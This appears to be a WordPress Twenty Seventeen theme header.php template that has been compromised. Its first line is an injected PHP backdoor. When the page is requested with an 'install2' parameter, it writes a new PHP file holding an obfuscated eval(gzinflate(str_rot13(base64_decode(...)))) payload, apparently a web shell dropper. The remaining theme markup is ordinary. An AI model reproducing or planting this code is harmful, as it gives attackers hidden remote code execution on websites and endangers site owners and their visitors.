<?php if (isset($_GET['install2'])) { $data = "<?php eval(gzinflate(str_rot13(base64_decode('rUl6Yts2EP68APkPDHRANk3LdocBUhIZC29sDbbYmXLvixMIslHbeSREIKm4XpD/3jtF8liTc3ZEI0Bx3vPcPfeio5mUT4aSFU93ni+ax63TwwM+J80jrhTTzVMY+E5jORxZnUz0KbpmYVutXx4ODxr3XGQdizLXxCPHQHes2AwekTD61x9a6cfx+Dr8OAzG9BbNPP+0dB75/1n8YBxBU5cWMBPJGhA0VyKyjvIFAQaLNbnJ0TXyKcJHNHTZZMIA+gfPbLgAlQ4ehplVmLPRvwG2yFBQsbiUXK/BfWPe98Orbs8HB8N+n54+Hh6wR7EXQwMAmdBZFlltEGQplJ6t8yhwzVpTjv0fnvdtIyhGlTO700+Ck2KRU/7VY+zvkp5HvCrwSecTxJs3UyCfN+uu/emPp0Gcipxux7BuV5Qyc7stY4KL0eX1OOxf/u0Pzq98x7Qhbldm4npEveHF5MofjMPRYzhpYV3aTBV6nsd2CUN8STwrReYWywIbJJnN0MZ7WKzDllrgJ2nv5EjdO7HdA0O8FISedq5G1p3kf+VvlZM2CYxpEixMmp5orPV5JruYVlKZC5hkxf9w3nsSi0dV79cP5gPALmg3ZF1t1pl6yA04DFiYGI82qQt2hmMAtdHmsNllduu1MSZAgFFXnmvGRraGVPCwCeFFstgaF18banK9Kh42EAJFeXZLmmm29t3MyzzWXOSkS04wgvMVrxI75jEe2XZ5lJ7SRRZPNdH+1uk4cxiN6Qh6KcuNqdV+hwbJZylmgicugOvuPuycm1avzp8LZGbzPTEA/e0gSCAsmQMlkxnJ8C2GV1/jTSORqYFUdvflgl6ILIvypC7gGc+LRRO9LphUNfusKcEaezTOErpiDcpMxrdp64eS+ygtzfc7wGpDTNc53UrKoE7GUkmmmheR1AbXQSId1crrZzCb/1ZuRaQiV1Wfp8yk0U70k3mWPFZLXqlISfseYA78yoyziV92FfOD9faiigFbGfYJ2RWx4x+rdtnvfq/i5HmFD5TEdqSUp6M9ghVM2ehZYnd4E94r785txYpaHViuF3l2GAnHel9534GjhtFEZio5QG0wBrOQZAMHRqcuiWYLOAMyZpiJexZN7ywJEdB8lqKzIrQ02LobNa4JRon5Ka4wW7tU6qmIgJbgXmskaRmTPXtDxjFGinU4Zb9pB8vrpFToKWw0YtuTIkpQX0oZ3hFGssqYJebWqtZNIdnuBP1JQtCx+cCySbjnUPaZxVr0cbaaHaIOZened9m/WLOtBER22Bp+R4L4Lg1lXliQZhCAzQrNzQJ5uEwUXDRhB/7g+5wvVxnhWGHu5UktEJi7PyXID6hpRVLaduQ8K/wL')))); ?>"; file_put_contents("F03D83B60125828DD76F186829E2AFC1.php", $data); } ?>
<?php
/**
 * The header for our theme
 *
 * This is the template that displays all of the <head> section and everything up until <div id="content">
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since 1.0
 * @version 1.0
 */

?><!DOCTYPE html>
<html <?php language_attributes(); ?> class="no-js no-svg">
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">

<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>
<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'twentyseventeen' ); ?></a>

	<header id="masthead" class="site-header" role="banner">

		<?php get_template_part( 'template-parts/header/header', 'image' ); ?>

		<?php if ( has_nav_menu( 'top' ) ) : ?>
			<div class="navigation-top">
				<div class="wrap">
					<?php get_template_part( 'template-parts/navigation/navigation', 'top' ); ?>
				</div><!-- .wrap -->
			</div><!-- .navigation-top -->
		<?php endif; ?>

	</header><!-- #masthead -->

	<?php

	/*
	 * If a regular post or page, and not the front page, show the featured image.
	 * Using get_queried_object_id() here since the $post global may not be set before a call to the_post().
	 */
	if ( ( is_single() || ( is_page() && ! twentyseventeen_is_frontpage() ) ) && has_post_thumbnail( get_queried_object_id() ) ) :
		echo '<div class="single-featured-image-header">';
		echo get_the_post_thumbnail( get_queried_object_id(), 'twentyseventeen-featured-image' );
		echo '</div><!-- .single-featured-image-header -->';
	endif;
	?>

	<div class="site-content-contain">
		<div id="content" class="site-content">